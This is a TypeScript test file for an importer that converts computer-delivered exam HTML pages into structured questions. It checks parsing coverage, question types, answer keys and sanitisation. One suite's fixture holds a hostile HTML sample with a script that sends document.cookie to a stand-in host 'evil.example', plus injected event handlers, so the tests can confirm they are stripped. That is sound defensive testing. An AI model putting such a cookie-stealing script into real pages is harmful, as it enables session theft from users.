import './env';
import { describe, it } from 'node:test';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { expect } from './harness';
import { PARSER_VERSION, importCdiHtml } from '../src/services/cdiImport';
import { toDraftMaterial } from '../src/services/cdiImport/toMaterial';
import { normalizeCdiHtml } from '../src/services/cdiImport/normalize';
import { QuestionSchema } from '../src/schemas/question';
import type { CdiImportResult } from '../src/services/cdiImport/types';

/**
 * The CDI importer, against whole pages.
 *
 * The direction of travel is the thing being tested: a real page goes in, and
 * canonical questions come out — not a mini-application. So alongside the
 * coverage figures there are assertions that nothing executable survives, that
 * no answer key is invented, and that a construct the parser cannot express is
 * reported rather than turned into the wrong question.
 *
 * Three fixtures are representative CDI pages with genuinely different
 * structure; the fourth is deliberately hostile.
 */

// Pinned before the HTTP suite below changes the working directory, so a
// fixture is found whichever order the runner evaluates these in.
const FIXTURE_ROOT = path.join(process.cwd(), 'tests', 'fixtures', 'cdi');
const fixture = (name: string) => readFileSync(path.join(FIXTURE_ROOT, `${name}.html`), 'utf8');

/** Stands in for the route, which stores inline assets for real. */
let assetCounter = 0;
const withInlineAssets = (html: string) =>
  importCdiHtml(html, {
    resolveAsset: (asset) =>
      asset.origin === 'inline' ? `ast_test${String(++assetCounter).padStart(11, '0')}` : null,
  });

const numbers = (result: CdiImportResult) => result.questions.map((q) => q.questionNumber);
const typeOf = (result: CdiImportResult, n: number) =>
  result.questions.find((q) => q.questionNumber === n)?.question?.type;
const answerOf = (result: CdiImportResult, n: number) =>
  result.questions.find((q) => q.questionNumber === n)?.question?.correctAnswer;
const questionAt = (result: CdiImportResult, n: number) =>
  result.questions.find((q) => q.questionNumber === n);

/* -------------------------------------------------------------------------- */
/* Fixture 1: a live player export, driven by controls                         */
/* -------------------------------------------------------------------------- */

describe('fixture: listening with controls', () => {
  const result = importCdiHtml(fixture('listening-controls'));

  it('converts at least 90% of the questions it finds', () => {
    expect(result.stats.detected).toBe(19);
    expect(result.stats.parsed).toBe(19);
    expect(result.stats.coverage).toBeGreaterThanOrEqual(0.9);
  });

  it('reads the page for what it is', () => {
    expect(result.detectedSection).toBe('listening');
    expect(result.title).toContain('Listening Practice');
    expect(result.parserVersion).toBe(PARSER_VERSION);
  });

  it('numbers questions as the page does', () => {
    expect(numbers(result).slice(0, 5)).toEqual([1, 2, 3, 4, 5]);
    // 15 and 16 are one "choose TWO letters" task, so 16 is not a separate
    // question. The gap is reported rather than papered over.
    expect(numbers(result)).not.toContain(16);
    expect(result.diagnostics.some((d) => d.code === 'numbering_gap')).toBe(true);
  });

  it('gives each family its canonical type', () => {
    expect(typeOf(result, 1)).toBe('note_completion');
    expect(typeOf(result, 6)).toBe('table_completion');
    expect(typeOf(result, 11)).toBe('multiple_choice');
    expect(typeOf(result, 15)).toBe('multi_select');
    expect(typeOf(result, 17)).toBe('matching');
  });

  it('reads prompts from the page, not from the numbering', () => {
    expect(questionAt(result, 11)?.question?.prompt).toContain('tip taxi drivers');
    expect(questionAt(result, 17)?.question?.prompt).toBe('no music');
    // The dropdown's own option list is not part of the question.
    expect(questionAt(result, 17)?.question?.prompt).not.toContain('ABCDEF');
  });

  it('carries options with their printed labels', () => {
    const q11 = questionAt(result, 11)?.question;
    expect(q11?.options).toHaveLength(3);
    expect(q11?.options?.[0]).toContain('as much as they feel right');
    expect(questionAt(result, 17)?.question?.options).toHaveLength(6);
  });

  it('takes the word limit and the rubric from the group header', () => {
    expect(questionAt(result, 1)?.question?.wordLimit).toBe('NO MORE THAN TWO WORDS AND/OR A NUMBER');
    expect(questionAt(result, 6)?.question?.wordLimit).toBe('ONE WORD ONLY');
    expect(questionAt(result, 1)?.question?.instruction).toContain('Complete the note');
  });

  it('groups the table gaps so they render as a table', () => {
    const q6 = questionAt(result, 6)?.question;
    expect(q6?.layout).toBe('table_row');
    expect(q6?.group).toBeTruthy();
    expect(questionAt(result, 7)?.question?.group).toBe(q6?.group);
  });

  it('extracts answer keys only from the page', () => {
    expect(answerOf(result, 1)).toBe('Brown');
    expect(answerOf(result, 11)).toBe('A');
    // The key sits on the second option, not the first, and is still found.
    expect(answerOf(result, 12)).toBe('B');
    expect(answerOf(result, 15)).toEqual(['B', 'D']);
    for (const q of result.questions) {
      if (q.status === 'parsed') expect(q.answerStatus).toBe('extracted');
    }
  });

  it('finds the audio the page needs', () => {
    const audio = result.assets.filter((a) => a.kind === 'audio');
    expect(audio).toHaveLength(1);
    expect(audio[0].originalSrc).toBe('audio/section1.mp3');
    // A path the page only references cannot be imported from the page alone.
    expect(audio[0].origin).toBe('local');
    expect(result.diagnostics.some((d) => d.code === 'asset_missing')).toBe(true);
  });

  it('reports the script it refused to run', () => {
    expect(result.diagnostics.some((d) => d.code === 'script_removed')).toBe(true);
    expect(result.unsupportedRegions.some((r) => r.construct === 'script-driven question')).toBe(true);
  });

  it('keeps the transcript separately from the questions', () => {
    expect(result.transcript).toContain('Lakeside Eco Farm');
  });
});

/* -------------------------------------------------------------------------- */
/* Fixture 2: a printed export with numbering markers and an answer key        */
/* -------------------------------------------------------------------------- */

describe('fixture: reading with numbering markers only', () => {
  const result = importCdiHtml(fixture('reading-markers'));

  it('converts at least 90% of the questions it finds', () => {
    expect(result.stats.detected).toBe(13);
    expect(result.stats.parsed).toBe(13);
    expect(result.stats.coverage).toBeGreaterThanOrEqual(0.9);
  });

  it('reads a page that has no controls at all', () => {
    // Every question here is a bare `12.` marker; the inputs were stripped on
    // export. A control-only parser would find nothing.
    expect(result.detectedSection).toBe('reading');
    expect(numbers(result)).toEqual([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]);
  });

  it('types each group from its rubric', () => {
    expect(typeOf(result, 1)).toBe('matching_headings');
    expect(typeOf(result, 5)).toBe('true_false_not_given');
    expect(typeOf(result, 9)).toBe('sentence_completion');
    expect(typeOf(result, 12)).toBe('multiple_choice');
  });

  it('prefers the narrowest rubric over the section banner', () => {
    // "You should spend about 20 minutes on Questions 1–13" also covers
    // question 1; the heading rubric is the one that says what the task is.
    expect(questionAt(result, 1)?.question?.instruction).toContain('correct heading');
  });

  it('attaches the option bank printed above the questions', () => {
    const q1 = questionAt(result, 1)?.question;
    expect(q1?.options).toHaveLength(5);
    expect(q1?.options?.[0]).toContain('A weakness that grows');
    // Every member of the group gets the same bank.
    expect(questionAt(result, 4)?.question?.options).toHaveLength(5);
  });

  it('gives the statement family its three legal values', () => {
    expect(questionAt(result, 5)?.question?.options).toEqual(['TRUE', 'FALSE', 'NOT GIVEN']);
  });

  it('finds options printed as sibling lines', () => {
    const q12 = questionAt(result, 12)?.question;
    expect(q12?.options).toHaveLength(3);
    expect(q12?.options?.[0]).toContain('not unique to biology');
  });

  it('reads the answer key section', () => {
    expect(answerOf(result, 1)).toBe('ii');
    expect(answerOf(result, 5)).toBe('TRUE');
    expect(answerOf(result, 6)).toBe('NOT GIVEN');
    expect(answerOf(result, 9)).toBe('cues');
    expect(answerOf(result, 12)).toBe('A');
  });

  it('resolves entities rather than carrying them through', () => {
    expect(result.title).toContain('—');
    expect(result.normalizedText).not.toContain('&ndash;');
  });
});

/* -------------------------------------------------------------------------- */
/* Fixture 3: mixed controls, media, labelling                                 */
/* -------------------------------------------------------------------------- */

describe('fixture: listening with a map and mixed layouts', () => {
  const result = withInlineAssets(fixture('listening-mixed'));

  it('converts at least 90% of the questions it finds', () => {
    expect(result.stats.detected).toBe(10);
    expect(result.stats.parsed).toBe(10);
    expect(result.stats.coverage).toBeGreaterThanOrEqual(0.9);
  });

  it('keeps a labelling task as a labelling task', () => {
    // Not a gap fill: without the map, "the library is beside the ___" is
    // unanswerable, and the type is what tells the engine to show it.
    expect(typeOf(result, 11)).toBe('map_label');
    expect(typeOf(result, 14)).toBe('map_label');
  });

  it('attaches the map by asset id, never by the path in the page', () => {
    const media = questionAt(result, 11)?.question?.mediaRef;
    expect(media?.kind).toBe('image');
    expect(media?.assetId).toMatch(/^ast_/);
    expect(media?.alt).toBe('Campus map');
    // Every question in the labelling group refers to the same picture.
    expect(questionAt(result, 12)?.question?.mediaRef?.assetId).toBe(media?.assetId);
  });

  it('distinguishes form rows, and short answers, from each other', () => {
    expect(typeOf(result, 15)).toBe('form_completion');
    expect(questionAt(result, 15)?.question?.layout).toBe('table_row');
    expect(typeOf(result, 18)).toBe('short_answer');
    expect(questionAt(result, 18)?.question?.prompt).toContain('language lab');
  });

  it('carries multi-word answers intact', () => {
    expect(answerOf(result, 19)).toBe('every twenty minutes');
    expect(answerOf(result, 16)).toBe('12 October');
  });
});

/* -------------------------------------------------------------------------- */
/* Fixture 4: hostile and incomplete                                           */
/* -------------------------------------------------------------------------- */

describe('fixture: unsupported and incomplete constructs', () => {
  const result = importCdiHtml(fixture('mixed-hostile'));

  it('parses nothing it cannot stand behind', () => {
    // Every question here is missing something real. Zero parsed is the correct
    // answer, not a failure.
    expect(result.stats.parsed).toBe(0);
    expect(result.stats.needsReview).toBe(4);
    expect(result.stats.unsupported).toBe(4);
  });

  it('names the constructs it will not attempt', () => {
    const constructs = result.unsupportedRegions.map((r) => r.construct);
    expect(constructs).toContain('drag and drop');
    expect(constructs).toContain('canvas widget');
  });

  it('reports a widget-driven question instead of inventing one', () => {
    const q5 = questionAt(result, 5);
    expect(q5?.status).toBe('unsupported');
    expect(q5?.question).toBeUndefined();
    const q8 = questionAt(result, 8);
    expect(q8?.status).toBe('unsupported');
    expect(q8?.detectedAs).toBe('hotspot');
  });

  it('never invents a missing answer key', () => {
    // The key section supplies 1 and 3 but says nothing about 4, and 4 does not
    // acquire one from anywhere.
    const q4 = questionAt(result, 4);
    expect(q4?.answerStatus).toBe('missing');
    expect(q4?.question).toBeUndefined();
    expect(q4?.draft?.correctAnswer).toBeUndefined();
    expect(q4?.status).toBe('needs_review');
    expect(result.diagnostics.some((d) => d.code === 'answer_key_missing')).toBe(true);
  });

  it('treats a duplicated key as ambiguous rather than picking one', () => {
    // The answer section lists "3. A" and then "3. B".
    const q3 = questionAt(result, 3);
    expect(q3?.status).toBe('needs_review');
    expect(q3?.answerStatus).not.toBe('extracted');
  });

  it('holds a labelling question that has no importable picture', () => {
    const q2 = questionAt(result, 2);
    expect(q2?.status).toBe('needs_review');
    expect(q2?.diagnostics.some((d) => d.code === 'asset_missing' || d.code === 'asset_external')).toBe(true);
  });

  it('records an external image without fetching it', () => {
    const external = result.assets.find((a) => a.origin === 'external');
    expect(external?.originalSrc).toContain('cdn.example.com');
    expect(result.diagnostics.some((d) => d.code === 'asset_external')).toBe(true);
  });

  it('survives unclosed tags rather than throwing', () => {
    // Fixture 4 leaves <label> elements unclosed.
    expect(result.questions.length).toBeGreaterThan(0);
  });
});

/* -------------------------------------------------------------------------- */
/* Safety and output contract                                                  */
/* -------------------------------------------------------------------------- */

describe('nothing imported becomes executable', () => {
  const hostile = `
    <html><body onload="steal()">
      <script>fetch('https://evil.example/'+document.cookie)</script>
      <h3>Questions 1-1</h3><p>Choose the correct letter, A, B or C.</p>
      <fieldset><legend>1. Which?</legend>
        <label><input type="radio" name="q1" value="A" data-answer="A" onclick="evil()"> Alpha</label>
        <label><input type="radio" name="q1" value="B"> Beta</label>
      </fieldset>
      <iframe src="https://evil.example"></iframe>
      <img src="x" onerror="alert(1)">
    </body></html>`;

  it('removes script, iframe and event handlers before parsing', () => {
    const document = normalizeCdiHtml(hostile);
    // Walked rather than serialised: DOM nodes hold parent references.
    const tags: string[] = [];
    const attributes: string[] = [];
    const walk = (nodes: any[]) => {
      for (const node of nodes) {
        if (!node || typeof node !== 'object' || !('name' in node)) continue;
        tags.push(String(node.name));
        for (const key of Object.keys(node.attribs ?? {})) attributes.push(key);
        walk(node.children ?? []);
      }
    };
    walk(document.root as any[]);

    expect(tags).not.toContain('script');
    expect(tags).not.toContain('iframe');
    expect(attributes.filter((a) => a.startsWith('on'))).toEqual([]);
    // The question's own markup is still there to be read.
    expect(tags).toContain('fieldset');
    expect(tags).toContain('input');
  });

  it('still reads the question the page carried', () => {
    const result = importCdiHtml(hostile);
    expect(result.stats.parsed).toBe(1);
    expect(typeOf(result, 1)).toBe('multiple_choice');
    expect(answerOf(result, 1)).toBe('A');
  });

  it('sanitises the display markup it hands back', () => {
    const result = importCdiHtml(hostile);
    expect(result.normalizedHtml).not.toContain('<script');
    expect(result.normalizedHtml).not.toContain('onerror');
    expect(result.normalizedHtml).not.toContain('<iframe');
    // Controls do not survive into display markup either: behaviour belongs to
    // the learner engine, not to imported HTML.
    expect(result.normalizedHtml).not.toContain('<input');
  });

  it('handles an empty or junk document without throwing', () => {
    for (const input of ['', '   ', '<p>no questions here</p>', '<<<>>']) {
      const result = importCdiHtml(input);
      expect(result.stats.detected).toBe(0);
      expect(result.diagnostics.some((d) => d.code === 'no_questions_found')).toBe(true);
    }
  });
});

describe('the importer emits the canonical model', () => {
  it('every parsed question validates against the phase 4 schema', () => {
    for (const name of ['listening-controls', 'reading-markers', 'listening-mixed']) {
      const result = withInlineAssets(fixture(name));
      for (const entry of result.questions) {
        if (entry.status !== 'parsed') continue;
        const parsed = QuestionSchema.safeParse(entry.question);
        expect(parsed.success).toBe(true);
      }
    }
  });

  it('every question points back at the markup it came from', () => {
    const html = fixture('reading-markers');
    const result = importCdiHtml(html);
    for (const entry of result.questions) {
      expect(entry.sourceRange.end).toBeGreaterThan(entry.sourceRange.start);
      expect(entry.sourceRange.excerpt.length).toBeGreaterThan(0);
      // The excerpt really is that slice of the original page.
      expect(html.slice(entry.sourceRange.start, entry.sourceRange.end)).toContain(
        entry.sourceRange.excerpt.slice(0, 40),
      );
    }
  });

  it('builds a draft material only when the skill is known', () => {
    const reading = importCdiHtml(fixture('reading-markers'));
    const draft = toDraftMaterial(reading, { sourceAssetId: 'ast_source00000001' });
    expect(draft?.section).toBe('reading');
    expect(draft?.status).toBe('draft');
    expect(draft?.parserVersion).toBe(PARSER_VERSION);
    expect(draft?.sourceAssetId).toBe('ast_source00000001');
    expect((draft?.content as any).passage.questions).toHaveLength(13);

    // An ambiguous page is not filed under a guess.
    const ambiguous = importCdiHtml(fixture('mixed-hostile'));
    expect(ambiguous.detectedSection).toBe(null);
    expect(toDraftMaterial(ambiguous)).toBe(null);
  });

  it('leaves unreviewed questions out of the draft, and says so', () => {
    const result = importCdiHtml(fixture('mixed-hostile'));
    const drafted = result.questions.filter((q) => q.status === 'parsed').length;
    expect(drafted).toBe(0);
    expect(result.stats.needsReview + result.stats.unsupported).toBe(result.stats.detected);
  });
});
